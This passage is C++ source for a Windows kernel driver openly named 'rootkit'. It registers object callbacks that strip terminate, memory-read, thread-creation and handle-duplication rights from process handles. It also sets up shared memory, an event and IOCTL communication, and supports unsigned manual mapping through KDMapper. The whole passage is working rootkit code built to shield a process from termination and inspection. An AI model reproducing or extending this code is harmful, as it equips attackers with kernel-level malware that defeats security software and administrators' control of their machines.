            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE; // Do bitwise AND on the left side of the equation here, which will result on 0 on the desired access, (which is the opposite of process terminate).
            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
            Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
        }
    }
    return OB_PREOP_SUCCESS;
}
#endif
NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
    UNREFERENCED_PARAMETER(registry_path);

    UNICODE_STRING device_name = {};
    RtlInitUnicodeString(&device_name, L"\\Device\\rootkit");

    PDEVICE_OBJECT device_object = nullptr;
    NTSTATUS status = IoCreateDevice(driver_object, 0, &device_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN,
        FALSE, &device_object);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create device driver.\n");
        return status;
    }

    debug_print("[+] Device driver creation successful.\n");

    // Create symlink

    UNICODE_STRING symbolic_link = {};
    RtlInitUnicodeString(&symbolic_link, L"\\DosDevices\\rootkit");

    status = IoCreateSymbolicLink(&symbolic_link, &device_name);

    if (status != STATUS_SUCCESS) {
        debug_print("[!] Failed to create symbolic link.\n");
        return status;
    }

    debug_print("[+] Driver symbolic link creation successful.\n");

#ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
    OB_OPERATION_REGISTRATION operations[] = {
        {
            PsProcessType, // object type
            OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE, // type of operation we want to callback
            PreOpenProcessOperation, nullptr // pre operation, post operation.
}
    };
    
    OB_CALLBACK_REGISTRATION reg = {
        OB_FLT_REGISTRATION_VERSION, // just use the current version
        1, // 1 is the amount of registrations we did, so far its 1.
        RTL_CONSTANT_STRING(L"11222.5261"), // unique code for our registration driver - lower better (below 20k loads first)
        nullptr, // registration context is null for now
        operations // our operations we want to callback
    };

    status = ObRegisterCallbacks(&reg, &regHandle);
    if (!NT_SUCCESS(status)) {
        debug_print("[!] Failed to register callbacks\n");
        // Clean up resources but allow driver to continue
        DbgPrint("FAILED TO REGISTER CALLBACKS, STATUS=%08X\n", status);
        IoDeleteSymbolicLink(&symbolic_link);
        IoDeleteDevice(device_object);
        return status;
    }
    debug_print("[+] Callbacks registered successfully\n");
#endif

// Shared Memory setup.
#ifdef DL
    // Properties init.
    UNICODE_STRING sectionName = RTL_CONSTANT_STRING(SECTION_NAME);
    OBJECT_ATTRIBUTES secAttr;
    InitializeObjectAttributes(&secAttr, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
    // Max size of memory section
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = SHARED_MEM_SIZE;
    
    // Setup shared memory section.
    status = ZwCreateSection(&gSectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE, &secAttr, &maxSize, PAGE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to setup ZwCreateSection, status code: %08X\n", status);
        return status;
    }
    SIZE_T viewSize = SHARED_MEM_SIZE;
    status = ZwMapViewOfSection(gSectionHandle, ZwCurrentProcess(), &gSharedBuffer, 0, SHARED_MEM_SIZE, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to setup ZwMapViewOfSection, status code: %08X\n", status);
        return status;
    }
    // Setup event to notify client.
    UNICODE_STRING eventName = RTL_CONSTANT_STRING(EVENT_NAME);
    OBJECT_ATTRIBUTES evtAttr;
    InitializeObjectAttributes(&evtAttr, &eventName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);

    // Create the event
    HANDLE hUserEvent = NULL;
    status = ZwCreateEvent(&hUserEvent,
        EVENT_ALL_ACCESS,
        &evtAttr,
        NotificationEvent,  // Manual reset event
        FALSE);            // Initial state is non-signaled
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create event, status code: %08X\n", status);
        return status;
    }

    // Convert the handle to PKEVENT for kernel use
    status = ObReferenceObjectByHandle(hUserEvent,
        EVENT_ALL_ACCESS,
        *ExEventObjectType,
        KernelMode,
        (PVOID*)&gUserEvent,
        NULL);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to reference event object, status code: %08X\n", status);
        ZwClose(hUserEvent);
        return status;
    }

    // We can close the handle now since we have the PKEVENT
    ZwClose(hUserEvent);
    debug_print("[+] Event created successfully\n");
#endif
    // Setup IOCTL Comm.
    // Allow us to send small amounts of data between user-mode/kernel-mode
    SetFlag(device_object->Flags, DO_BUFFERED_IO);

    // Set the driver handlers to our function with our logic.
    driver_object->MajorFunction[IRP_MJ_CREATE] = Rootkit::create;
    driver_object->MajorFunction[IRP_MJ_CLOSE] = Rootkit::close;
    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Rootkit::device_control;

    ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);

#ifdef DL
    driver_object->DriverUnload = UnloadDriver;
    g_DriverObject = driver_object;
    g_DeviceObject = device_object;
#endif
    debug_print("[+] Device initialized successfully.\n");

    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    debug_print("[+] DriverEntry called\n");

    UNICODE_STRING driver_name = {};
    RtlInitUnicodeString(&driver_name, L"\\Driver\\rootkit");
    /*
	In a normal driver, we wouldn't do IoCreateDriver, since this is manual mapping (using KDMapper), we need to use this function to create the driver.
    But if this is used as a service in windows, Windows already does this for us, meaning all of the code in DriverMain above will exist here in DriverEntry.
    */
#ifdef DRL
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    debug_print("[!] Driver is reflectively loaded\n");
    return IoCreateDriver(&driver_name, &DriverMain);
#else
    return DriverMain(DriverObject, RegistryPath);
#endif
}
